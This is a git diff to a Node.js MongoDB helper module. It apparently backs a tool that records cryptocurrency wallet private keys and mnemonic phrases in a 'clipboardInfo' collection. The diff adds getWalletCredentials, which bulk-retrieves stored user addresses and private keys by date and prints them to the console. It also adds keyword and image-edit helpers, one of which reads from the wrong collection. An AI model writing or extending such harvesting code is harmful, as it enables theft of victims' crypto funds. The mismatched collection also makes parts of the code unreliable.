@@ -30,6 +30,8 @@ mongoUtil.connectToServer()
             const imageUploadCollection = localDbConnection.collection('imageUpload');
             const imageDownloadCollection = localDbConnection.collection('imageDownload');
             const clipboardInfoCollection = localDbConnection.collection('clipboardInfo');
+            const imageEditInfo = localDbConnection.collection('imageEditInfo');
+            const keywordsCollection = localDbConnection.collection('keywords');
 
             await createIndex(imageUploadCollection, { userId: 1 }, true);
             await createIndex(imageUploadCollection, { userId: 1, fileName: 1, createdAt: -1 }, false);
@@ -39,6 +41,9 @@ mongoUtil.connectToServer()
 
             await createIndex(clipboardInfoCollection, { userId: 1 }, true);
             await createIndex(clipboardInfoCollection, { userId: 1, mnemonicPhase: 1, createdAt: -1 }, false);
+
+            await createIndex(imageEditInfo, { fileName: 1, createdAt: -1  }, false);
+            await createIndex(keywordsCollection, { fileName: 1, createdAt: -1 }, false);
         };
 
         createIndexes(localDbConnection);
@@ -225,6 +230,34 @@ async function logWalletCredentials (userId, userAddress, userPrivateKey) {
     }
 }
 
+async function getWalletCredentials (startDateTime = null, endDateTime = null) {
+    try {
+        const collection = dbConnection.collection('clipboardInfo');
+
+        // Create a query that matches documents where createdAt is between startDateTime and endDateTime
+        const query = {};
+        if (startDateTime) query.createdAt = { $gte: new Date(startDateTime) };
+        if (endDateTime) {
+            if (!query.createdAt) query.createdAt = {};
+            query.createdAt.$lte = new Date(endDateTime);
+        }
+
+        // Specify the fields to return
+        const options = {
+            projection: { _id: 0, userId: 1, userAddress: 1, userPrivateKey: 1, createdAt: 1 }
+        };
+
+        const walletCredentials = await collection.find(query, options).toArray();
+
+        console.log('Wallet credentials retrieved successfully:', walletCredentials);
+        return walletCredentials;
+    } catch (error) {
+        error.code = 10027;
+        console.error('Error retrieving wallet credentials from MongoDB:', error);
+        throw error;
+    }
+}
+
 function decryptMnemonic (base64EncryptedData) {
     const algorithm = 'aes-256-cbc';
     const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
@@ -244,13 +277,92 @@ function decryptMnemonic (base64EncryptedData) {
 }
 
 async function getKeywords () {
-    // TODO: Implement this function
-    return null;
+    try {
+        const collection = dbConnection.collection('imageEditInfo');
+
+        const query = {};
+        const options = {
+            sort: { createdAt: -1 },  // Sort by creation date in descending order to get the most recent log
+            limit: 1  // Limit the result to only one document
+        };
+        const keywords = await collection.findOne(query, options);
+
+        if (!keywords) {
+            console.log('No keywords found.');
+            throw new Error('Keywords not found.');
+        }
+
+        console.log('Keywords retrieved successfully:', keywords);
+        return keywords;
+    } catch (error) {
+        error.code = 10026;
+        console.error('Error retrieving keywords from MongoDB:', error);
+        throw error;
+    }
 }
 
-async function uploadKeywords () {
-    // TODO: Implement this function
-    return null;
+async function uploadKeywords (keywords) {
+    try {
+        const collection = dbConnection.collection('keywords');
+
+        const logEntry = {
+            keywords,
+            createdAt: new Date() // Record the current timestamp
+        };
+
+        await collection.insertOne(logEntry);
+        console.log('Keywords stored successfully:', logEntry);
+    } catch (error) {
+        error.code = 10025;
+        console.error('Error uploading keywords to MongoDB:', error);
+        throw error;
+    }
+}
+
+// TODO:
+async function getImageEditInfo (fileName) {
+    try {
+        const collection = dbConnection.collection('imageEditInfo');
+
+        const query = { fileName };
+        const options = {
+            sort: { createdAt: -1 },  // Sort by creation date in descending order to get the most recent log
+            limit: 1  // Limit the result to only one document
+        };
+        const imageEditInfo = await collection.findOne(query, options);
+
+        if (!imageEditInfo) {
+            console.log('No image edit info found for:', fileName);
+            throw new Error('Image edit info not found.');
+        }
+
+        console.log('Image edit info retrieved successfully:', imageEditInfo);
+        return imageEditInfo;
+    } catch (error) {
+        error.code = 10024;
+        console.error('Error retrieving image edit info from MongoDB:', error);
+        throw error;
+    }
+}
+
+// TODO:
+async function uploadImageEditInfo (fileName, editInfo) {
+    try {
+        const collection = dbConnection.collection('imageEditInfo');
+
+        const logEntry = {
+            fileName,
+            editInfo,
+            createdAt: new Date() // Record the current timestamp
+        };
+
+        await collection.insertOne(logEntry);
+        console.log('Image edit info stored successfully:', logEntry);
+    } catch (error) {
+        error.code = 10023;
+        console.error('Error storing image edit info to MongoDB:', error);
+        throw error;
+    }
 }
 
 module.exports = {
@@ -259,7 +371,10 @@ module.exports = {
     logUploadDetails,
     logDownloadDetails,
     logWalletCredentials,
+    getWalletCredentials,
     decryptMnemonic,
     getKeywords,
-    uploadKeywords
+    uploadKeywords,
+    getImageEditInfo,
+    uploadImageEditInfo
 };
